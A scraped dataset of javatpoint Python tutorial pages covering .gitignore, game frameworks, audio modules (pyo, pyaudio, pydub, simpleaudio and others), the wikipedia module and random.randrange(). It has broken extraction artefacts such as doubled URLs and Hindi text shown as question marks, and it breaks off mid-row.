'Venv.bak /', 'env.bak /', '.pytest_cache', '.cover /', '.coverage', '$ git log']",[],[],"[""|||One version is on the user's hard drive that the user is editing.|||Another version is stored by the Git module in the user's staging area.|||The third version is present in the repository of the file.||||||Storing generated files in the repository is a waste of space and time. The generated files can be created again, and it may need to be recreated in a different format. If user 1 is using IronPython or Cython, and user 2 is using Jython interpreter, then the .pyc files would be different from each other. And committing the one format of the .pyc file could create conflicts in the repository.|||The generated filers are comparatively larger than the source files of the project. Adding the generated files in the Git repository means that all the other users and developers of the particular project also have to download the files and store them, even they do not need the files.|||Another rule of the Git repository is that the user should commit the binary files with precautions and should avoid committing files of large size.|||""]"
149,['Top Python Frameworks for Gaming'],"['There are many popular games available in the gaming world which was developed using the Python frameworks and its libraries, for example, Battlefield 2, Pirates of the Caribbean and many more. Most of the developers use python language over other programming languages because of its functionalities and add-ons. With the progress in gaming development industries, Python programming is an exceptional choice of the developers for rapid prototyping of video games.']","['https://www.javatpoint.com/python-audio-modules', 'https://www.javatpoint.com/git-modules-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/pygame', 'https://www.javatpoint.com/https://www.javatpoint.com/c-programming-language-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/kivy', 'https://www.javatpoint.com/https://www.javatpoint.com/python-pandas', 'https://www.javatpoint.com/https://www.javatpoint.com/cpp-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/javascript-tutorial', 'https://www.javatpoint.com/python-audio-modules', 'https://www.javatpoint.com/git-modules-in-python', 'https://www.javatpoint.com/python-audio-modules']","['https://static.javatpoint.com/python/images/top-python-frameworks-for-gaming1.png', 'https://static.javatpoint.com/python/images/top-python-frameworks-for-gaming2.png', 'https://static.javatpoint.com/python/images/top-python-frameworks-for-gaming3.png', 'https://static.javatpoint.com/python/images/top-python-frameworks-for-gaming4.png', 'https://static.javatpoint.com/python/images/top-python-frameworks-for-gaming5.png', 'https://static.javatpoint.com/python/images/top-python-frameworks-for-gaming6.png', 'https://static.javatpoint.com/python/images/top-python-frameworks-for-gaming7.png', 'https://static.javatpoint.com/python/images/top-python-frameworks-for-gaming8.png']",[],"['1. Pygame', '2. PyKyra', '3. Pyglet', '4. PyOpenGL', '5. Kivy', '6. Panda3D', '7. Python-Ogre', ""8. Ren'Py"", '9. Cocos2d', '10. Soya3d', 'Conclusion']",[],[],"['In this article, we will discuss the top 10 frameworks of Python which used for game development:', 'Features of pygame library of python:', 'Features of Pyglet library are:']",[],"[""PyGame is a Python's open - source library which used for making applications and software such as games which are developed using an exceptional SDL library. This library is developed upon C language, Python language, Native and OpenGL. Pygame allows the user to develop full - featured games and multimedia programs as well. This library is highly portable and can be run in any operating system and every platform."", 'The fastest framework of Python language is PyKyra, which is used for game development. PyKyra framework is based on Software and documentational localization ( SDL ) and the kyra engine. Apart from having such standard features, this framework of Python language also supports MPEG video and sounds such as MP3, WAV, Ogg Vorbis, Direct image reading, and much more.', 'Pyglet is a powerful Python library which is an open - source, cross - platform windowing and multimedia framework. This library is used for game development and many other visually - rich applications and software on Windows, Linux and Mac OS X operating systems. Pyglet is a library of python language, which supports user interface used for handling event, OpenGL graphics, Joysticks, loading videos and image, windowing, playing sounds and music. Pyglet library only runs under python 3.5 or above version of Python. It also works on other interpreters of Python like Pypy. Pyglet allows the users to use it for both open - source and commercial projects and developments with only a little restriction,', 'The most common cross - platform of Python is PyOpenGL. This framework is a binding Python to OpenGL and related APIs. In the PyOpenGL framework, the binding was developed by using the standard c - types library. This is a standardized framework of Python which is interoperable and has a huge number of external graphical user interfaces, audio libraries of Python like PyGame, Raw XLib, PyQt and many others.', 'Kivy library is developed using novel user interfaces, for example, multi - touch applications. Kivy library is used for the rapid development of applications and software. This framework runs on Windows, Android, Raspberry Pi, Linux, OS X, and iOS. It can naturally use many inputs, devices, and protocols like Mac OS X Trackpad and Magic Mouse, Mtdev, WM_Touch, WM_Pen, Linux kernel HID and TUIO. Kivy library is Graphics Processing Unit ( GPU ) fast-tracked. It also has more than 20 widgets, which are all highly extendable.', 'Kivy library is free to use under an MIT license starting from version 1.7.2 and LGPL 3 for the previous versions. The toolkit of this library is officially developed, and users can use it in a marketable product. This framework is very stable to use and has a fully documented API and also a programming guide to help users start using it.', 'Panda 3d is a framework of Python language, which is written in Python and C++. It is an open - source and free - to - use engine used for developing real - time 3d games, simulations, experiments visualization and many more. This framework has command - line tools for optimizing and processing the source.', 'Python - Orge is a framework used for game development, also known as PyOrge. It is written over C++ language library binding Python for the Orge 3d engine. This framework is a cross - platform and has flexibility and rapidity. It supports a remarkable feature set which has been used to develop exciting games. PyOrge framework actually consist of two libraries called Orge3D and CEGUi. Orge3s is a 3D rendering engine, and CEGUi is an embedded graphical user interface ( GUI ) system.', 'Orge is used to develop scenes and create all the graphics user wants to import into the game. The PyOrge framework is used for versions developed before the Orge v1.05 version. After that, many other modules are available. The Orge software also contains Python scripts for importing data from Blender to Orge. This Framework makes it easy for the user to create their resources in Blender for their Game and can import data to Orge. Other form of exporters is also available in this framework.', ""Ren'Py is a Python Framework which is free to use and cross platform. This framework is written in Python and Cython. Ren'Py is used for digital storytelling, which makes it easy for the users to combine words, images and sounds altogether and develop graphic novels and life replication games. As Ren'Py engine supports Python scripting language, which allows the users to work with complex game logic. The biggest advantage of this framework is that it can be used on any operating system of the computer."", 'Cocos 2D is a Python framework which is used for developing games, applications, software, and many other cross - platform graphical user interface (GUI ) based interactive programs. This framework is a software-based open - source. Cocos 2d is a large family which contains Cococs2D - x, Cocos2D - XNA, and Ccos2D - JS. This Framework is written in the C++ programming language. It has a thin layer of Platform dependency, which can be used to build games, applications and software. Cococs2D - JS is a JavaScript version of an engine that supports the full functionality of Cocos2D - x, including the set of simplified APIs.', 'Soya 3D is a high - level framework of Python used for developing 3D video games. This framework is free to use, which is licensed under the General Public License ( GPL ). This Framework is a multi - platform engine of games development which can be run on Linux, Microsoft Windows and Mac OS X operating system. The creator of this framework describes Soya 2D as a game engine that is fully focused on rapid development. It is very easy and simple to use. The basic goal of this framework is to enable amateur users to develop sophisticated 3D games completely in the Python programming language.', 'As nowadays, Gaming has become an active part of our daily lives, and advancements in the gaming world have led developers to develop high - quality, impressive games. In this article, we have discussed the top 10 Python frameworks that can be used for game development and their specific functionalities that are useful for developing specific functions and featured in video games.']",[],[],[],"[""|||Pygame|||PyKyra|||Pyglet|||PyOpenGL|||Kivy|||Panda3D|||Python - Ogre|||Ren'Py|||Cocos2d|||Soya3D||||||Multicore CPUs can be easily in this library.|||It uses optimized C and Assemble codes for core functions.|||This library is very simple and portable.|||In this library, very few lines of code can work.||||||Pykyra framework is developed to support side symmetric and top-down translations.|||In Pykyra, the user can divide the screen into the sub - windows views, and each view of the sub - windows has its own object transformation.|||Kyra engine is fast and capable which have specialized coded algorithms used for rendering the updates.|||This framework included the well - advanced toolchains like sprite editor and encoder.|||The kyra engine also supports the merging alpha values and colour transformations.|||All objects in this framework are embedded into a regulated hierarchy.|||Pykyra also has a feature by which complex objects can be pointed up and down whenever they are drawn or mapped in the pre - cached form.||||||It has portable native windowing.|||This library also has a built - in support for images and audios.|||Pyglet library does not need any installation requirements and also doesn't have any external dependencies.|||""]"
150,['Python Audio Modules'],"['Python programming language is a leading nowadays because of its user - friendly features. Python also has many interesting modules and libraries by which users can do a lot by using them. One of the most interesting features of the Python language is its Audio modules. In this article, we will discuss the various types of audio modules and their unique features and advantages.']","['https://www.javatpoint.com/wikipedia-module-in-python', 'https://www.javatpoint.com/top-python-frameworks-for-gaming', 'https://www.javatpoint.com/https://www.javatpoint.com/python-features', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-modules', 'https://www.javatpoint.com/http://ajaxsoundstudio.com/software/pyo/', 'https://www.javatpoint.com/https://github.com/tyiannak/pyAudioAnalysis/', 'https://www.javatpoint.com/https://www.javatpoint.com/windows', 'https://www.javatpoint.com/https://www.javatpoint.com/linux-tutorial', 'https://www.javatpoint.com/https://github.com/worldveil/dejavu', 'https://www.javatpoint.com/https://github.com/chimezie/python3-mingus', 'https://www.javatpoint.com/http://arrowtheory.com/software/hypersonic/index.html', 'https://www.javatpoint.com/https://github.com/jiaaro/pydub', 'https://www.javatpoint.com/wikipedia-module-in-python', 'https://www.javatpoint.com/top-python-frameworks-for-gaming', 'https://www.javatpoint.com/wikipedia-module-in-python']",[],[],"['1. PYO', '2. pyAudio', '3. Dejavu', '4. Mingus', '5. hYPerSonic', '6. Pydub', '7. Simpleaudio', '8. winsound', '9. python-sounddevice', '10. playsound', 'Conclusion:']",[],[],"['This article will cover 10 different types of audio modules and libraries in python:', ""Let's understand the above audio modules one by one."", 'For example:', 'For example:', 'For example:', 'Now users can start fingerprinting their audio collection!', 'For example:', '# for invalid notes:', 'The following code can be used to play a WAV file with pydub:', 'For example:', 'if user wants to play other audio files formats like MP3 files, they should install libav or FFmpeg.', 'After installing FFmpeg, the user needs to make a small change in the code to play an MP3 file.', 'For example:', 'By using the AudioSegment.from_file (file_name, file_type ) statement, users can play any format supported by ffmpeg of the audio file.', 'For example:', 'For example:', 'For example:', 'To generate a Numpy array corresponding to a 410 Hz tone.', 'winsound is a module in Python which is used for accessing the basic sound - playing machinery of the Windows operating system.', 'In the winsound module, the WAV file can be played in just a few lines of code.', 'For example:', 'For example:', 'If the user wants to play a WAV file, they should install NumPy and soundfile to open an audio file format in WAV files as NumPy arrays.', 'For example:', 'For example:', 'The playsound module is used for files formatted in WAV file and MP3 file, and it can also work with other file formats.']","['This library provides bindings for PortAudio. The users can use this library for playing and recording audio on different platforms, like Windows, Mac and Linux. For playing audio by using the pyaudio library, the user has to write to a .stream.', 'Although, as pyaudio library provides more low - level control, which makes it possible for the users to set the parameters for their input and output devices. This library also lets the users check the load of their CPU and input - output activity.', 'Dejavu module surpasses at the recognition of particular signals with a realistic amount of noise. There are two forms in which user can use Dejavu to recognize the audio:', 'However, users can open and save the WAV file by using the pydub library without any dependencies. But users are required to install an audio playback package if they want to play audio.', 'Pydub library also allows the users to save the audio in different file formats. Users can also calculate the length of the audio files. User can use cross - fades in the audio by using this library.', 'In a WAV format file, a categorization of bits is stored which represents the raw audio data, and headers along with metadata in Resource Interchange File format is also stored.', 'The definitive record of the industry is to store every audio sample, which is a particular data point related to air pressure, as at 44200 samples per second, a 16 - bit value, for CD recordings.', 'For reducing the size of the file, it is sufficient for storing few recordings like Human speech, at a lower sampling rate, like 8000 samples per second. However, the higher sound frequencies cannot be represented much accurately.', 'Users can play NumPy arrays and bytes object in the simpleaudio library by using simpleaudio.play_buffer ( ) statement. But, before this, users should make sure that they have already installed NumPy and simpleaudio libraries.', 'winsound module does not support any file format except WAV files. It allows the users to beep their speakers by using winsound.Beep ( frequency, duration ) statement.', 'The python - sounddevice is a python module for cross - platform audio play back. This module provides bindings for the PortAudio library and has some suitable functions to play and record NumPy arrays, which contain audio signals.', 'playsound is a Python module by which users can play sound in a single line of code. It is a cross - platform module which is a single function without any dependencies for playing sounds and audios.']","['PYO is a Module of Python is written in the C programming language for the creation of a digital signal processing script. This module of Python contains classes for processing a wide variety of audio signal types. Due to this, users are able to import signal processing chains directly in Python scripts or projects and can manipulate the audio signals in real time by using an interpreter.', 'The tool of PYO modules in Python have primitives such as mathematical operations, basic signal processing like delays, synthesis generators, filters, and much more. But it also complexes the algorithms to develop sound granulation and many other artistic audio operations.', 'Pyaudio is a Python library which is an open - source and cross - platform audio input - output. It has a wide range of functionalities, which are audio - related and mainly focusing on segmentation, features extraction, classification and visualization issues.', 'By using the pyaudio library, users can classify unknown sounds, perform supervised and unsupervised segmentation, extract audio features and representations, detect audio events and filter out silence periods from the long recordings, apply dimensionality reduction to visualize audio data and content similarities and much more.', ""Here, users can notice that playing audio using the pyaudio library can be a bit complex, comparing the other audio playing libraries. That's why this library might not be the first choice of users for playing the audio in their projects or applications."", 'Pyaudio library also allows its users to play and record the audio in callback mode. Where a stated callback function is called when new data is needed for playback and available for recording. These are the features of the pyaudio library, which makes it different from other audio libraries and modules. This library is specifically used if the user wants to play the audio beyond simple playback.', 'Dejavu is an audio fingerprinting module in Python. It is an open - source module. This module can remember the recorded audio by listening to it once, and this module stores the audio in the database. After this, when a song is played, or microphone input or a disk file, Dejavu tries to match the audio with the fingerprints stored in the database and return the song or recording which was played earlier.', ""Mingus is a package in Python. It is used by many programmers, musicians' researchers and composers for making and examining the music and songs. This package is a cross - platform and very advanced music theory representing package for python along with Musical Instrument Digital Interface files and playback support."", ""Mingus package can be used to play with music theory, for education tools, to build editors for songs, and in many other applications and software's in which users want to import the function of processing and playing music. This package is a music theory, and it includes topics like scales, progressions, chords and intervals. This package tests these components and is used for generating and recognizing the musical essentials with the help of convenient shorthand."", 'hYPerSonic is a framework of Python and C language. This is used for developing and operating the sound processing pipelines, which are intended for real - time control. This framework is a low - level in which every byte count, and this also includes objects for soundcard, filters memory operations, file - io, and oscillators. This framework is operated on Linux and OSX operating systems.', 'Pydub is a Python library used for manipulating audios and adding effects to it. This library is a very simple and easy but high - level interface which is based on FFmpeg and inclined by jquery. This library is used for adding id3 tags in audio, slicing it, and concatenating the audio tracks. Pydub library supports 2.6, 2.7, 3.2 and 3.3 versions of Python.', 'Simpleaudio is a Python library which is a cross - platform. This library is also used for playing back WAV files without any dependencies. simpleaudio library waits for the file to finish the playing audio in WAV format before termination of the script.', 'Some of the libraries and modules discussed in this article play and records the bytes objects, and some of them use NumPy arrays to record raw audio data. Both resemble to a categorization of data points that can be played back at a definite sample rate to play audio.', 'In a NumPy array, every element can contain a 16 - bit value equivalent to an individual sample, and for the bytes object, each sample is stored as a set of two 8 - bit values. The important difference between these two data types is that the NumPy arrays are mutable, and the bytes objects are immutable, which makes the latter more suitable for generating audios and processing the more complex signals.', 'The statement sound_file.read ( ) used for extracting the raw audio data and also the sampling rate of the file, which are stored in Resource Interchange File format header. sound_device.wait ( ) statement is used to make sure that the script is only terminated after the audio finishes playing.', 'In this article, we have discussed various types of Python Library and modules which are used for playing and recording different types of audio files and sounds. Here, we have explained the different features and importance of each library and modules for playing sounds in the project of developing and modifying applications and software.']","['# to play a sound file:', 'from pyo import *', 'sound = Server ( ) .boot ( )', 'sound.start  ( )', 'sound_file = SFPlayer ( "" path /to /users /sound.aif "", speed = 1, loop = True ).out ( )', '# for Granulating an audio buffer:', 'sound = Server ( ) .boot ( )', 'sound_nd = SndTable ( "" path /to /users /sound.aif "" )', 'ev = HannTable ( )', 'ps = Phasor ( freq = sound_nd.getRate ( )*.25, ml = sound_nd.getSize ( ) )', 'dr = Noise ( mul = .001, add = .1 )', 'granulate = Granulator ( sound_nd, ev, [ 1, 1.001 ] , ps, dr, 32, ml = .1 ).out ( )', '# to generate melodies:', 'sound = Server ( ) .boot ( )', 'sound.start ( )', 'wv = SquareTable ( )', 'ev = CosTable ( [ ( 0, 0 ) , ( 100 , 1 ) , ( 500 , 0.3 ) , ( 8391 , 0 ) ] )', 'mt = Metro ( 0.135 , 12 ).play ( )', 'ap = TrigEnv ( mt , table = ev , dr = 1 , ml = .1 )', ""pt = TrigXnoiseMidi ( mt , dist = ' loopseg ' , x1 = 20 , scale = 1 , mrange = ( 47, 74 ) )"", 'out = Osc ( table = wav , freq = pt , ml = ap ).out ( )', 'import pyaudio', 'import wave', ""filename = ' example.wav '"", '# Set chunk size of 1024 samples per data frame', 'chunksize = 1024', '# Now open the sound file, name as wavefile', ""wavefile = wave.open ( filename, ' rb ' )"", '# Create an interface to PortAudio', 'portaudio = pyaudio.PyAudio ( )', '# Open a .Stream object to write the WAV file to play the audio using pyaudio', ""# in this code, 'output = True' means that the audio will be played rather than recorded"", 'streamobject = portaudio.open(format = portaudio.get_format_from_width ( wavefile.getsampwidth ( ) ),', 'channels = wavefile.getnchannels ( ),', 'rate = wavefile.getframerate ( ),', 'output = True ( )', '# Read data in chunksize', 'Data_audio = wavefile.readframes ( chunksize )', '# Play the audio by writing the audio data to the streamobject', ""while data != '':"", 'streamobject.write ( data_audio )', 'data_audio = wavefile.readframes ( chunksize )', '# Close and terminate the streamobject', 'streamobject.close ( )', 'portaudio.terminate ( )', '#User should create a MySQL database where Dejavu can store fingerprints of the audio.', '#on user local setup:', '$ mysql -u root -p', 'Enter password: *************', 'mysql> HERE, USER SHOULD CREATE A DATABASE dejavu;', 'from dejavu import Dejavu', 'config = {', '"" database "": {', '"" host "": "" 125.0.1.1 "",', '"" user "": "" root "",', '"" password "": < password imported in Local setup >,', '"" database "": < name of the database user has created in local setup >,', 'dejv = Dejavu ( config )', 'import mingus.core.notes as notes_m', '# for valid notes', 'notes_m.is_valid_note(""C"")', 'notes_m.is_valid_note(""D#"")', 'notes_m.is_valid_note(""Eb"")', 'notes_m.is_valid_note(""Fbb"")', 'notes_m.is_valid_note(""G##"")', 'notes_m.is_valid_note(""c"")', 'notes_m.is_valid_note(""D #"")', 'notes_m.is_valid_note(""E-b"")', 'from pydub import AudioSegment', 'from pydub.playback import play', ""sound_audio = AudioSegment.from_wav ( ' example.wav ' )"", 'play ( sound_audio )', 'from pydub import AudioSegment', 'from pydub.playback import play', ""sound_audio = AudioSegment.from_mp3 ( 'example.mp3 ' )"", 'play ( sound_audio )', '# Users can play a WMA file:', ""sound = AudioSegment.from_file ( 'example.wma ', ' wma ' )"", 'import simpleaudio as simple_audio', ""filename = ' example.wav '"", 'wave_object = simple_audio.WaveObject.from_wave_file ( filename )', 'play_object = wave_object.play ( )', 'play_object.wait_done ( )', '# Wait until audio has finished playing', 'import numpy as numpy', 'import simpleaudio as simple_audio', ""frequency = 410  # user's played note will be 410 Hz"", 'fsample = 44200  # 44200 samples per second will be played', 'second = 5  # Note duration of 5 seconds', '# Generate array with second*sample_rate steps, ranging between 0 and seconds', 'tp = numpy.linspace ( 0 , second , second * fsample, False )', '# to generate a 410 Hz sine wave', 'note = numpy.sin ( frequency * tp * 2 * numpy.pi )', '# user should Ensure that highest value is in 16-bit range', 'audio = note * (2**15 - 1) / numpy.max ( numpy.abs ( note ) )', '# now, Convert to 16-bit data', 'ado = audio.astype ( numpy.int16 )', '# to Start the playback', 'play_object = simple_audio.play_buffer ( ado , 1 , 2 , fsample )', '# user now Waits for playback to finish before exiting', 'play_object.wait_done ( )', 'import winsound', ""filename = ' example.wav '"", 'winsound.PlaySound ( filename, winsound.SND_FILENAME )', '# User can beep a 1010 Hz tone for 110 milliseconds:', 'import winsound', 'winsound.Beep ( 1010, 110 )  # Beep at 1010 Hz for 110 milliseconds', 'import sounddevice as sound_device', 'import soundfile as sound_file', ""filename = ' example.wav '"", '# now, Extract the data and sampling rate from file', ""data_set, fsample = sound_file.read ( filename , dtype = ' float32 ' )"", 'sound_device.play ( data_set, fsample )', '# Wait until file is done playing', 'status = sound_device.wait ( )', 'from playsound import playsound', ""playsound ( ' example.wav ' )""]","['True', 'True', 'True', 'True', 'True', 'False', 'False', 'False']",[],"[""'|||PYO|||PyAudio|||Dejavu|||Mingus|||hYPerSonic|||pydub|||simpleaudio|||winsound|||python - sounddevice|||playsound||||||User can recognize the audio by reading and processing the audio files on disk.||||||User can use the Computer's microphone.|||""]"
151,['Wikipedia Module in Python'],"['In this article, we will discuss the Wikipedia module in Python and also discuss how we can utilize the Wikipedia module using the Python script. We will fetch the verity of information from the Wikipedia.']","['https://www.javatpoint.com/python-random-randrange', 'https://www.javatpoint.com/python-audio-modules', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-random-randrange', 'https://www.javatpoint.com/python-audio-modules', 'https://www.javatpoint.com/python-random-randrange']",[],[],"['Introduction', 'Installation', 'Getting Started with Wikipedia Module', 'Extracting Metadata of Title', 'Getting Full Wikipedia Page Data', 'Conclusion']","['Search Title and Result', 'Suggestion', 'Summary of the Article', 'Customizing the Page Language']",[],"['The above command will install the module in the system. Now, we need to import it using the following command.', 'Now we are ready to extract data from the Wikipedia.', 'Wikipedia module consists of various built-in methods which help to get the desired information.', 'The above code printed the four results because have made request to get only four results.', 'The summary of the give title printed and we customized the number of sentences in the summary text to be displayed by using the sentences argument.', 'It will be always remembered the summary() method raises a ""disambiguation error"" if the page doesn\'t exist. Let\'s understand the following example.', 'As we can see in the above code, it converted the request page in the Hindi. We can change any of the language using the set_lang() method.']","['Wikipedia is the largest platform on the internet, which contains tons of information. It is an open-source platform which manages by the community of volunteer editors using a wiki-based editing system. It is a multi-lingual encyclopedia.', 'This module wraps the official Wikipedia API. In the first step, we will install the Wikipedia module using the following pip command. Type the below command in the terminal-', ""The Python Wikipedia module allows us to search a query supplied as an argument using the search() method. This method returns a list of all articles that contain the searched query. Let's understand the following example."", 'As we can see in the above output, the method returned the title and the related search. We can limit the number of search titles by passing a value for the result parameter. Consider the following example.', ""As the name suggests, the suggest method returns the suggested Wikipedia title for the query or none if it doesn't found any. Let's see the following example."", 'In the above code, we have searched for the ""Coronavirus"" but type the wrong spelling. The suggest() method returned None, because it didn\'t find the searched query.', ""Python Wikipedia module provides the summary() method, which returns the article's summary or topic. This method takes the two arguments - title and sentences and returns the summary in the string format. Let's consider the below example."", ""We can get the complete metadata or text content of the Wikipedia page excluding images, table, etc. This module provides the content attribute of the page object. Let's see the following example."", ""Python Wikipedia module allows us to get the full Wikipedia using the page() function. It returns the page content, categories, coordinate, images, links and other metadata. Let's understand the following example."", ""We can change the default language of the existed page. The set_lang() method is used to change the page language. Each language has a standard prefix code which is passed as an argument in the method. Let's understand the following example."", 'We have covered all important concepts of the Wikipedia API using the Python code. We have also discussed how to get the variety of the information such as page title, summary, category and extract the data from the web.']","['Internet is the most significant source of information. All knowledge is just one click away from us if we have an internet connection. Therefore, it is necessary to know how we can gather correct information from the right source. When we retrieve the information form various sources, this term is called Data Scraping. We all have used Wikipedia. It is the land of the full of information.', 'Python provides the Wikipedia module (or API) to scrap the data from the Wikipedia pages. This module allows us to get and parse the information from Wikipedia. In simple words, we can say that it is worked as a little scrapper and can scrap only a limited amount of data. Before we start working with it, we need to install this module on our local machine.']","['$pip install wikipedia', 'import wikipedia', 'import wikipedia', '# Seaching a title', 'print(wikipedia.search(""India""))', 'import wikipedia', '# Seaching a title', 'print(wikipedia.search(""India"", results = 4))', 'import wikipedia', 'print(wikipedia.suggest(""Coronavrdsf""))', 'import wikipedia', 'print(wikipedia.summary(""Rohit Sharma"", sentences=4))', 'print(wikipedia.summary(""key""))', 'import wikipedia', 'print(wikipedia.page(""Sachin Tendulkar"").content)', 'import wikipedia', '# wikipedia page object is created', 'object = wikipedia.page(""America"")', '# printing html of page_object', 'print(object.html)', '# printing title', 'print(object.original_title)', '# printing links on that page object', 'print(object.links[0:20])', 'import wikipedia', 'wikipedia.set_lang(""hi"")', 'print(wikipedia.summary(""Python""))']","[""['India', 'Constitution of India', 'Demographics of India', 'Languages of India', 'Republic Day (India)', 'Government of India', 'Economy of India', 'History of India', 'The Times of India', 'List of prime ministers of India']"", ""['India', 'Constitution of India', 'Demographics of India', 'Languages of India']"", 'None', 'Rohit Gurunath Sharma (born 30 April 1987) is an Indian international cricketer who plays for Mumbai in domestic cricket and captains Mumbai Indians in the Indian Premier League as a right-handed batsman and an occasional right-arm off break bowler. He is the vice-captain of the Indian national team in limited-overs formats.', 'Outside cricket, Sharma is an active supporter of animal welfare campaigns. He is the official Rhino Ambassador for WWF-India and is a member of People for the Ethical Treatment of Animals (PETA).', 'Traceback (most recent call last):', 'File ""C:/Users/DEVANSH SHARMA/PycharmProjects/MyPythonProject/pillow_image.py"", line 194, in', 'print(wikipedia.summary(""key""))', 'File ""C:\\Users\\DEVANSH SHARMA\\PycharmProjects\\MyPythonProject\\venv\\lib\\site-packages\\wikipedia\\util.py"", line 28, in __call__', 'ret = self._cache[key] = self.fn(*args, **kwargs)', 'File ""C:\\Users\\DEVANSH SHARMA\\PycharmProjects\\MyPythonProject\\venv\\lib\\site-packages\\wikipedia\\wikipedia.py"", line 231, in summary', 'page_info = page(title, auto_suggest=auto_suggest, redirect=redirect)', 'File ""C:\\Users\\DEVANSH SHARMA\\PycharmProjects\\MyPythonProject\\venv\\lib\\site-packages\\wikipedia\\wikipedia.py"", line 276, in page', 'return WikipediaPage(title, redirect=redirect, preload=preload)', 'File ""C:\\Users\\DEVANSH SHARMA\\PycharmProjects\\MyPythonProject\\venv\\lib\\site-packages\\wikipedia\\wikipedia.py"", line 299, in __init__', ""self.__load(redirect=redirect, preload=preload)raise DisambiguationError(getattr(self, 'title', page['title']), may_refer_to)"", 'wikipedia.exceptions.DisambiguationError: ""Key"" may refer to:', 'Key (cryptography)', 'Key (lock)', 'Key (map)', 'typewriter', 'test', 'Cay', 'Key, Alabama', 'Key, Ohio', 'Key, West Virginia', 'Keys, Oklahoma', 'Florida Keys', ""Sachin Ramesh Tendulkar ( (listen); born 24 April 1973) is an Indian former international cricketer who served as captain of the Indian national team. He is widely regarded as one of the greatest batsmen in the history of cricket. He is the highest run scorer of all time in International cricket. Considered as the world's most prolific batsman of all time, he is the only player to have scored one hundred international centuries, the first batsman to score a double century in a One Day International (ODI), the holder of the record for the most runs in both Test and ODI cricket, and the only player to complete more than 30,000 runs in international cricket. In 2013, he was the only Indian cricketer included in an all-time Test World XI named to mark the 150th anniversary of Wisden Cricketers' Almanac."", '............', '>', 'United States', ""['.as', '.com', '.edu', '.gov', '.gu', '.mil', '.mp', '.net', '.org', '.pr', '.um', '.us', '.vi', '100th meridian west', '117th United States Congress', '1790 United States Census', '1800 United States Census', '1810 United States Census', '1820 United States Census', '1830 United States Census']"", '????? ?? ??????? ??????? ?? ??? ???????, ???? ?????? ???????????? ???? (General Purpose and High Level Programming language), ???????????, ???????? ?????????, ???????????? ???? ??? ?? ???? ?? ?? ??? ?? ?????? ???? ??? ?? ???? ????? ???? ?? ??? ????? ?? ???? ?? ???? ?? ?????', '???? ???????????? ?????? ?? ??????, ?????? ???-??????? ?? ??????? ?? ??? ????? ?????? ( {} ) ?? ???????? ???? ???? ??, ????? ??? ???-??????? ?? ??????? ?? ??? ?????? ????? (white space) ?? ?????? ???? ???? ??? ?? ???????????? ???? ?? Guido van Rossum ?? 1991 ??? ????? ??? ?? ??????? ?? ???????????? ???? ?? ?????? ????????? ????? ?? ??? ??? ?? ??????, ???? ?????-??????? ???? ?? ????? ???? ??? ????? ""????? ???? ?? ??? ???? ?????? ????????? ?????"" ?? ???? ???? ??? ?? ???? ???? ????????? (standard library) ???? ?? ?????? ???', '?? ???? ?? ??????-????? ??? ???-??????? (code readability) ?? ??? ???? ??? ??? ????? ?? ???? ?? ?? ???? ????????? ???? ?????? ??; ???? ???? ????????? ????? ?? ?????????? (comprehensive) ??? ?? ?????? ???????? ?? ??? ????? ?????? ????? ??? (pre-installed) ??? ???', '???? ?????? ?????? ?? ???, ????? ????? ?? ???????????? ???? ?? ??? ??? ?????? ???? ???? ??, ????? ??? ??? ??? ???????????? ???????? ?? ?? ??????? ?????? ??? ?? ?????? ???? ???? ??? ??? ??????? ?? ????? ????, ????? ??? ?????????? ???????? ????? ????????? (???????????? ?????????) ?? ??? ??? ??? ???? ?? ???? ??? ????? ??????????? ?? ???????? ?????? ?? ??? ?????? ????']",[],[]
152,['Python random randrange()'],"['The Python random module allows generating random numbers. The generated numbers are a sequence of pseudo-random numbers, which are based on the used function. There are different types of functions used in a random module to generate random numbers, such as random.random(), random.randint(), random.choice(), random.randrange(start, stop, width), and many more.']","['https://www.javatpoint.com/permutation-and-combination-in-python', 'https://www.javatpoint.com/wikipedia-module-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-random-module', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/permutation-and-combination-in-python', 'https://www.javatpoint.com/wikipedia-module-in-python', 'https://www.javatpoint.com/permutation-and-combination-in-python']","['https://static.javatpoint.com/python/images/python-random-randrange.png', 'https://static.javatpoint.com/python/images/python-random-randrange2.png', 'https://static.javatpoint.com/python/images/python-random-randrange3.png']",[],"['Syntax of random.randrange()', 'random.choice()', 'random.sample()', 'List sort()']","['Examples 1: random.randrange() generate a random integers number within the given range', 'Example 2: Generate a random integer number range (multiple) of n', 'Example 3: Generate the random integer number of a specific length', 'Example 4: Generate a random negative integer number:', 'Example 5: Generate random positive or negative integer number', 'random.randint()']","['Note that the parameter start and stop, which is passed in random.randrange() function must be in increasing order, such as random.randrange(5, 10) or random.randrange(-20, -10). The start parameter always be smaller than the stop parameter; otherwise, this function generates an error as ""Traceback (most recent call last) and raise ValueError empty range for randrange()"".']","[""Let's generate the random integer number between 5 to 100, which is a range of 5 such as 5, 10, 25, …, 90, 95."", 'Example: Generate a random number of 3 digit using random.randrange()', ""Let's see an example that generates a random negative integer number between -50 to -10."", 'For example:', ""Some of the other functions of Python's random module that are used to generate numbers randomly are:"", 'Syntax of ramdom.choice()', 'Here the parameter sequence can be string, list, tuple, and random.choice() only a single random element.', 'Example 1:', 'In this example, we are providing on sequence (list) as a parameter and returning a single random element.', 'Example 2:', 'Python random.randint() function is used to generate a random integer number within the specified range.', 'Example of random.randint() generating a list of random integer', 'Example of a random.sample() to generate random elements from a list without duplicates:', 'In this example, we will generate 10 random integers from the range 0 to 100.', ""If you want to generate a list of random numbers and each of them must be multiple of 'n', then use the step parameter of range() function."", 'For example, generating 10 random integers which are multiple of 5 from the range 0 to 100 using random.sample(range(0, 100, 5), 10).', 'Example 1: sort() sorting list elements in ascending order', 'In this example, we will generate a random list of 5 numbers in a range of 50 to 100 with the width of 5 and sort them using sort() function.', 'Example 2: sort() sorting list elements in descending order', 'In this example, we will sort the list elements in descending order using randomList.sort(reverse=True).']","['The randrange(start, stop, width) function does not include the end parameter while generating the random integer number. The stop parameter is 